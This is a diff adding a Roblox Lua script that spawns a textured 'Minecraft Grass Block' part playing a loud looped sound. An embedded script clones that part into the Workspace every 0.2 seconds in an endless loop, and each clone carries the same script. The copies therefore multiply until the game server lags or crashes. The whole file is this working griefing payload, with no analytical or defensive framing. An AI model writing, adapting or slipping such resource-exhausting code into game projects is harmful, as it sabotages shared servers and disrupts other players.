@@ -1,0 +1,82 @@
+
+--Converted with ttyyuu12345's model to script plugin v4
+function sandbox(var,func)
+	local env = getfenv(func)
+	local newenv = setmetatable({},{
+		__index = function(self,k)
+			if k=="script" then
+				return var
+			else
+				return env[k]
+			end
+		end,
+	})
+	setfenv(func,newenv)
+	return func
+end
+cors = {}
+mas = Instance.new("Model",game:GetService("Lighting"))
+Model0 = Instance.new("Model")
+Part1 = Instance.new("Part")
+Decal2 = Instance.new("Decal")
+Decal3 = Instance.new("Decal")
+Decal4 = Instance.new("Decal")
+Decal5 = Instance.new("Decal")
+Decal6 = Instance.new("Decal")
+Decal7 = Instance.new("Decal")
+Script8 = Instance.new("Script")
+Sound9 = Instance.new("Sound")
+Model0.Name = "hello your computer"
+Model0.Parent = mas
+Part1.Name = "Minecraft Grass Block"
+Part1.Parent = Model0
+Part1.CFrame = CFrame.new(22.0168018, -151.378342, 453.795563, 1, -4.78923721e-05, 1.81198448e-06, 4.78923466e-05, 1, 1.3664634e-05, -1.81263886e-06, -1.36645476e-05, 1)
+Part1.Position = Vector3.new(22.016801834106445, -151.3783416748047, 453.7955627441406)
+Part1.Size = Vector3.new(30.078594207763672, 30.417673110961914, 30.685029983520508)
+Part1.BottomSurface = Enum.SurfaceType.Smooth
+Part1.TopSurface = Enum.SurfaceType.Smooth
+Decal2.Parent = Part1
+Decal2.Texture = "rbxassetid://3027402982"
+Decal2.Face = Enum.NormalId.Top
+Decal3.Parent = Part1
+Decal3.Texture = "rbxassetid://3027402330"
+Decal3.Face = Enum.NormalId.Left
+Decal4.Parent = Part1
+Decal4.Texture = "rbxassetid://3027402330"
+Decal4.Face = Enum.NormalId.Right
+Decal5.Parent = Part1
+Decal5.Texture = "rbxassetid://3027402330"
+Decal5.Face = Enum.NormalId.Back
+Decal6.Parent = Part1
+Decal6.Texture = "rbxassetid://3027402330"
+Decal7.Parent = Part1
+Decal7.Texture = "rbxassetid://3027464199"
+Decal7.Face = Enum.NormalId.Bottom
+Script8.Parent = Part1
+table.insert(cors,sandbox(Script8,function()
+while true do
+wait(0.2)
+local cl = script.Parent:clone()
+cl.Parent = game.Workspace
+cl.Position = script.Parent.Position
+wait(1)
+end
+
+
+
+end))
+Sound9.Parent = Part1
+Sound9.Looped = true
+Sound9.Playing = true
+Sound9.SoundId = "rbxassetid://6410047369"
+Sound9.Volume = 10
+for i,v in pairs(mas:GetChildren()) do
+	v.Parent = workspace
+	pcall(function() v:MakeJoints() end)
+end
+mas:Destroy()
+for i,v in pairs(cors) do
+	spawn(function()
+		pcall(v)
+	end)
+end
